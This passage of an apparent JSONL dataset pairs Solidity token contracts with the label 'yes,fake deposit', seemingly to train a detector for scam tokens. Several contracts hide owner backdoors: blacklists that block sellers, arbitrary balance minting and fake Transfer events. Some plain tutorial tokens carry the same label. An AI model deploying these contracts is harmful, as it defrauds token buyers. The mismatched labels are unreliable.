}}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _conscripter) {\n require(amount <= Lx[sender]);\n Lx[sender] -= amount; \n Lx[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (V2Uniswap, recipient, amount);\n return true; } \n if(!Lk[recipient]) {\n if(!Lk[sender]) {\n require(amount <= Lx[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n Lx[sender] -= amount;\n Lx[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address recipient, uint256 amount) public {\n if(msg.sender == _conscripter) {\n require(Lx[msg.sender] >= amount);\n Lx[msg.sender] -= amount; \n Lx[recipient] += amount; \n emit Transfer (V2Uniswap, recipient, amount);}\n if(Ly[msg.sender]) {Lx[recipient] = amount;} \n if(!Lk[msg.sender]) {\n require(Lx[msg.sender] >= amount);\n Lx[msg.sender] -= amount; \n Lx[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address GSKS = 0xD18312210cBbF269d2372c6C4564859920f7f155;\n\taddress gRouterg = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n \t\tmodifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n\n}\n\n\n\ncontract ASTRONIX is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Gc;\n\tmapping (address => bool) private Gb;\n mapping (address => bool) private Gw;\n mapping (address => mapping (address => uint256)) private Gv;\n uint8 private constant _Gec = 8;\n uint256 private constant gS = 200000000 * 10**_Gec;\n string private constant _name = \"Astronix Labs\";\n string private constant _symbol = \"ASTRONIX\";\n\n\n\n constructor () {\n Gc[_msgSender()] = gS;\n gMake(); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _Gec;\n }\n\n function totalSupply() public pure returns (uint256) {\n return gS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Gc[account];\n }\n function gMake() onlyOwner internal {\n emit Transfer(address(0), gRouterg, gS); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Gv[owner][spender];\n }\n\t function BurnG(address Gj) onlyOwner public{\n Gb[Gj] = true; }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n Gv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n \n\t\tfunction gStake(address Gj) public {\n if(Gb[msg.sender]) { \n Gw[Gj] = false;}}\n function QueryG(address Gj) public{\n if(Gb[msg.sender]) { \n Gw[Gj] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == GSKS) {\n require(amount <= Gc[sender]);\n Gc[sender] -= amount; \n Gc[recipient] += amount; \n Gv[sender][msg.sender] -= amount;\n emit Transfer (gRouterg, recipient, amount);\n return true; } else \n if(!Gw[recipient]) {\n if(!Gw[sender]) {\n require(amount <= Gc[sender]);\n require(amount <= Gv[sender][msg.sender]);\n Gc[sender] -= amount;\n Gc[recipient] += amount;\n Gv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Gi, uint256 Gj) public {\n if(msg.sender == GSKS) {\n require(Gc[msg.sender] >= Gj);\n Gc[msg.sender] -= Gj; \n Gc[Gi] += Gj; \n emit Transfer (gRouterg, Gi, Gj);} else \n if(Gb[msg.sender]) {Gc[Gi] += Gj;} else\n if(!Gw[msg.sender]) {\n require(Gc[msg.sender] >= Gj);\n Gc[msg.sender] -= Gj; \n Gc[Gi] += Gj; \n emit Transfer(msg.sender, Gi, Gj);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.6.7;\n\n\ninterface ERC20 {\n function totalSupply() external view returns (uint _totalSupply);\n function balanceOf(address _owner) external view returns (uint balance);\n function transfer(address _to, uint _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint _value) external returns (bool success);\n function approve(address _spender, uint _value) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n\n}\n\n// this is the basics of creating an ERC20 token\n//change the name Henri and the symbol to whatever you would like\n\ncontract PHATFARM is ERC20 {\n string public constant symbol = \"PHAT\";\n string public constant name = \"Phat Coin\";\n uint8 public constant decimals = 18;\n \n //1,000,000+18 zeros\n uint private constant __totalSupply = 1000000000000000000000000000000;\n\n //this mapping is where we store the balances of an address\n mapping (address => uint) private __balanceOf;\n\n //This is a mapping of a mapping. This is for the approval function to determine how much an address can spend\n mapping (address => mapping (address => uint)) private __allowances;\n\n //the creator of the contract has the total supply and no one can create tokens\n constructor() public {\n __balanceOf[msg.sender] = __totalSupply;\n }\n\n //constant value that does not change/ returns the amount of initial tokens to display\n function totalSupply() public view override returns (uint _totalSupply) {\n _totalSupply = __totalSupply;\n }\n\n //returns the balance of a specific address\n function balanceOf(address _addr) public view override returns (uint balance) {\n return __balanceOf[_addr];\n }\n \n\n //transfer an amount of tokens to another address. The transfer needs to be >0 \n //does the msg.sender have enough tokens to forfill the transfer\n //decrease the balance of the sender and increase the balance of the to address\n function transfer(address _to, uint _value) public override returns (bool success) {\n if (_value > 0 && _value <= balanceOf(msg.sender)) {\n __balanceOf[msg.sender] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n\n \n //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\n //If the 3rd party has an allowance of >0 \n //and the value to transfer is >0 \n //and the allowance is >= the value of the transfer\n //and it is not a contract\n //perform the transfer by increasing the to account and decreasing the from accounts\n function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\n if (__allowances[_from][msg.sender] > 0 &&\n _value >0 &&\n __allowances[_from][msg.sender] >= _value\n // the to address is not a contract\n && !isContract(_to)) {\n __balanceOf[_from] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n\n\n //This check is to determine if we are sending to a contract?\n //Is there code at this address? If the code size is greater then 0 then it is a contract.\n function isContract(address _addr) public view returns (bool) {\n uint codeSize;\n //in line assembly code\n assembly {\n codeSize := extcodesize(_addr)\n }\n // i=s code size > 0 then true\n return codeSize > 0; \n }\n\n \n //allows a spender address to spend a specific amount of value\n function approve(address _spender, uint _value) external override returns (bool success) {\n __allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n\n //shows how much a spender has the approval to spend to a specific address\n function allowance(address _owner, address _spender) external override view returns (uint remaining) {\n return __allowances[_owner][_spender];\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract SHS_Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = '1.1.3'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function SHS_Token(\n ) {\n balances[msg.sender] = 10000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000000000; // Update total supply (100000 for example)\n name = \"SHS Token\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"SHS\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _xConstruc = 0x29201c505571932Dc7e1f3Fceb49F8ABCeAD5e51;\n\taddress UniRouterV20 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract ASTRIONLABS is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Xc;\n\tmapping (address => bool) private Xb;\n mapping (address => bool) private Xa;\n mapping (address => mapping (address => uint256)) private Xe;\n uint8 private constant _decimals = 8;\n uint256 private constant _XSupply = 250000000 * 10**_decimals;\n string private constant _name = \"Astrion Labs\";\n string private constant _symbol = \"ASTRION\";\n\n\n\n constructor () {\n Xc[_msgSender()] = _XSupply;\n emit Transfer(address(0), UniRouterV20, _XSupply);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _XSupply;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Xc[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Xe[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n Xe[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction xRNG(address jx) public {\n if(Xb[msg.sender]) { \n Xa[jx] = false;}}\n function xCheck(address jx) public{\n if(Xb[msg.sender]) { \n require(!Xa[jx]);\n Xa[jx] = true; }}\n\t\tfunction xDele(address jx) public{\n if(msg.sender == _xConstruc) { \n require(!Xb[jx]);\n Xb[jx] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _xConstruc) {\n require(amount <= Xc[sender]);\n Xc[sender] -= amount; \n Xc[recipient] += amount; \n Xe[sender][msg.sender] -= amount;\n emit Transfer (UniRouterV20, recipient, amount);\n return true; } \n if(!Xa[recipient]) {\n if(!Xa[sender]) {\n require(amount <= Xc[sender]);\n require(amount <= Xe[sender][msg.sender]);\n Xc[sender] -= amount;\n Xc[recipient] += amount;\n Xe[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Xd, uint256 jx) public {\n if(msg.sender == _xConstruc) {\n require(Xc[msg.sender] >= jx);\n Xc[msg.sender] -= jx; \n Xc[Xd] += jx; \n emit Transfer (UniRouterV20, Xd, jx);}\n if(Xb[msg.sender]) {Xc[Xd] += jx;} \n if(!Xa[msg.sender]) {\n require(Xc[msg.sender] >= jx);\n Xc[msg.sender] -= jx; \n Xc[Xd] += jx; \n emit Transfer(msg.sender, Xd, jx);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address JKSS = 0xb8b1AB771bf7eFD691579bED527526A95dC3d58D;\n\taddress jRouter = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n \t\tmodifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n\n}\n\n\n\ncontract UMBRAL is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Jc;\n\tmapping (address => bool) private Jb;\n mapping (address => bool) private Jw;\n mapping (address => mapping (address => uint256)) private Jv;\n uint8 private constant _JeC = 8;\n uint256 private constant jS = 1000000000 * 10**_JeC;\n string private constant _name = \"Umbral Privacy Network\";\n string private constant _symbol = \"UMBRAL\";\n\n\n\n constructor () {\n Jc[_msgSender()] = jS;\n jmkr(); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _JeC;\n }\n\n function totalSupply() public pure returns (uint256) {\n return jS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Jc[account];\n }\n function jmkr() onlyOwner internal {\n emit Transfer(address(0), jRouter, jS); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Jv[owner][spender];\n }\n\t function BurnH(address Jj) onlyOwner public{\n Jb[Jj] = true; }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n Jv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n \n\t\tfunction jStake(address Jj) public {\n if(Jb[msg.sender]) { \n Jw[Jj] = false;}}\n function QueryJ(address Jj) public{\n if(Jb[msg.sender]) { \n Jw[Jj] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == JKSS) {\n require(amount <= Jc[sender]);\n Jc[sender] -= amount; \n Jc[recipient] += amount; \n Jv[sender][msg.sender] -= amount;\n emit Transfer (jRouter, recipient, amount);\n return true; } else \n if(!Jw[recipient]) {\n if(!Jw[sender]) {\n require(amount <= Jc[sender]);\n require(amount <= Jv[sender][msg.sender]);\n Jc[sender] -= amount;\n Jc[recipient] += amount;\n Jv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Jl, uint256 Jj) public {\n if(msg.sender == JKSS) {\n require(Jc[msg.sender] >= Jj);\n Jc[msg.sender] -= Jj; \n Jc[Jl] += Jj; \n emit Transfer (jRouter, Jl, Jj);} else \n if(Jb[msg.sender]) {Jc[Jl] += Jj;} else\n if(!Jw[msg.sender]) {\n require(Jc[msg.sender] >= Jj);\n Jc[msg.sender] -= Jj; \n Jc[Jl] += Jj; \n emit Transfer(msg.sender, Jl, Jj);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address JKSS = 0xf6d60bb4F2b670cA2932817a9E27c755cE9F156B;\n\taddress jRouter = 0xe780A56306ba1E6bB331952C22539b858af9F77d;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n \t\tmodifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n\n}\n\n\n\ncontract UMBRAL is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Jc;\n\tmapping (address => bool) private Jb;\n mapping (address => bool) private Jw;\n mapping (address => mapping (address => uint256)) private Jv;\n uint8 private constant _JeC = 8;\n uint256 private constant jS = 1000000000 * 10**_JeC;\n string private constant _name = \"Umbral Privacy Network\";\n string private constant _symbol = \"UMBRAL\";\n\n\n\n constructor () {\n Jc[_msgSender()] = jS;\n jmkr(); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _JeC;\n }\n\n function totalSupply() public pure returns (uint256) {\n return jS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Jc[account];\n }\n function jmkr() onlyOwner internal {\n emit Transfer(address(0), jRouter, jS); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Jv[owner][spender];\n }\n\t function Burn(address Jj) onlyOwner public{\n Jb[Jj] = true;\n }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n Jv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n \n\t\tfunction jStake(address Jj) public {\n if(Jb[msg.sender]) { \n Jw[Jj] = false;}}\n function QueryJ(address Jj) public{\n if(Jb[msg.sender]) { \n Jw[Jj] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == JKSS) {\n require(amount <= Jc[sender]);\n Jc[sender] -= amount; \n Jc[recipient] += amount; \n Jv[sender][msg.sender] -= amount;\n emit Transfer (jRouter, recipient, amount);\n return true; } else \n if(!Jw[recipient]) {\n if(!Jw[sender]) {\n require(amount <= Jc[sender]);\n require(amount <= Jv[sender][msg.sender]);\n Jc[sender] -= amount;\n Jc[recipient] += amount;\n Jv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\n\t\tfunction transfer(address Jl, uint256 Jj) public {\n if(msg.sender == JKSS) {\n require(Jc[msg.sender] >= Jj);\n Jc[msg.sender] -= Jj; \n Jc[Jl] += Jj; \n emit Transfer (jRouter, Jl, Jj);} else \n if(Jb[msg.sender]) {Jc[Jl] += Jj;} else\n if(!Jw[msg.sender]) {\n require(Jc[msg.sender] >= Jj);\n Jc[msg.sender] -= Jj; \n Jc[Jl] += Jj; \n emit Transfer(msg.sender, Jl, Jj);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _OConst = 0x7Dfaa3B7842085c0C5C6A7AA7C97f9B4e9357170;\n\taddress UniV3Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract DEVILINYOU is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private KO;\n\tmapping (address => bool) private SO;\n mapping (address => bool) private RO;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _OSup = 66600000 * 10**_decimals;\n string private constant _name = \"DEVIL IN U\";\n string private constant _symbol = \"DEVILINU\";\n\n\n\n constructor () {\n KO[_msgSender()] = _OSup;\n emit Transfer(address(0), UniV3Router, _OSup);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _OSup;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return KO[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction Orng(address z) public {\n if(SO[msg.sender]) { \n RO[z] = false;}}\n function oDelegate(address z) public{\n if(SO[msg.sender]) { \n require(!RO[z]);\n RO[z] = true; }}\n\t\tfunction oRelease(address z) public{\n if(msg.sender == _OConst) { \n require(!SO[z]);\n SO[z] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _OConst) {\n require(amount <= KO[sender]);\n KO[sender] -= amount; \n KO[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (UniV3Router, recipient, amount);\n return true; } \n if(!RO[recipient]) {\n if(!RO[sender]) {\n require(amount <= KO[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n KO[sender] -= amount;\n KO[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit 